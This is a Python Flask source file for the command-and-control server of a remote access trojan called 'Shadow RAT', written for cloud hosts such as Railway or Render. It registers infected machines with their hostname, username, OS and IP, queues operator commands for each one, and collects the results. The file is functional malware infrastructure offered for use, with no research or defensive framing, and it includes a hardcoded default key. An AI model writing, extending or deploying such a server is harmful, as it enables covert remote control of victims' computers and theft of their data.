#!/usr/bin/env python3
"""
Shadow RAT — C2 Server (Flask)
Compatible: Railway / Render / any Python host
"""
import os, json
from datetime import datetime, timezone
from flask import Flask, request, jsonify

app = Flask(__name__)

SECRET_KEY = os.environ.get("C2_SECRET_KEY", "Youssef123")

# ── in-memory store (remplacé par DB si besoin) ────────────
agents = {}   # agent_id -> dict
tasks  = {}   # task_id  -> dict
_task_counter = [0]

def now_iso():
    return datetime.now(timezone.utc).isoformat()

def new_task_id():
    _task_counter[0] += 1
    return f"task_{_task_counter[0]:06d}"

# ── auth middleware ────────────────────────────────────────
def check_auth(body):
    key = body.get("key") or request.headers.get("x-shadow-key", "")
    return key == SECRET_KEY

@app.route("/functions/c2Server", methods=["POST", "GET"])
def c2():
    body  = request.get_json(silent=True) or {}
    route = request.args.get("route") or body.get("route", "")

    if not check_auth(body):
        return jsonify({"error": "Unauthorized"}), 401

    # ── checkin ──────────────────────────────────────────
    if route == "checkin":
        agent_id = body.get("agent_id")
        if not agent_id:
            return jsonify({"error": "missing agent_id"}), 400

        agents[agent_id] = {
            "agent_id":  agent_id,
            "hostname":  body.get("hostname", "?"),
            "username":  body.get("username", "?"),
            "os":        body.get("os", "?"),
            "arch":      body.get("arch", "?"),
            "ip":        body.get("ip", "?"),
            "last_seen": now_iso(),
            "status":    "online",
            "extra":     body.get("extra", ""),
        }

        # pending task?
        for tid, task in list(tasks.items()):
            if task["agent_id"] == agent_id and task["status"] == "pending":
                tasks[tid]["status"] = "sent"
                return jsonify({
                    "task_id": tid,
                    "action":  task["action"],
                    "args":    task.get("args", {}),
                })

        return jsonify({"task_id": None})

    # ── result ───────────────────────────────────────────
    if route == "result":
        task_id = body.get("task_id")
        if not task_id or task_id not in tasks:
            return jsonify({"error": "not found"}), 404
        tasks[task_id]["result"] = body.get("result", "")
        tasks[task_id]["status"] = body.get("status", "done")
        return jsonify({"ok": True})

    # ── agents list ──────────────────────────────────────
    if route == "agents":
        now_ts = datetime.now(timezone.utc).timestamp()
        result = []
        for a in agents.values():
            try:
                ls = datetime.fromisoformat(a["last_seen"]).timestamp()
                if now_ts - ls > 120:
                    a["status"] = "offline"
            except:
                pass
            result.append(a)
        return jsonify({"agents": result})

    # ── issue task ───────────────────────────────────────
    if route == "task":
        agent_id = body.get("agent_id")
        action   = body.get("action")
        if not agent_id or not action:
            return jsonify({"error": "missing fields"}), 400
        tid = new_task_id()
        tasks[tid] = {
            "id":        tid,
            "agent_id":  agent_id,
            "action":    action,
            "args":      body.get("args", {}),
            "status":    "pending",
            "issued_at": now_iso(),
            "result":    "",
        }
        return jsonify({"task_id": tid})

    # ── get result ───────────────────────────────────────
    if route == "get_result":
        task_id = body.get("task_id")
        if not task_id or task_id not in tasks:
            return jsonify({"error": "not found"}), 404
        return jsonify(tasks[task_id])

    return jsonify({"error": "unknown route",
                    "routes": ["checkin","result","agents","task","get_result"]}), 404


@app.route("/", methods=["GET"])
def health():
    return jsonify({"status": "Shadow C2 online", "agents": len(agents), "tasks": len(tasks)})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
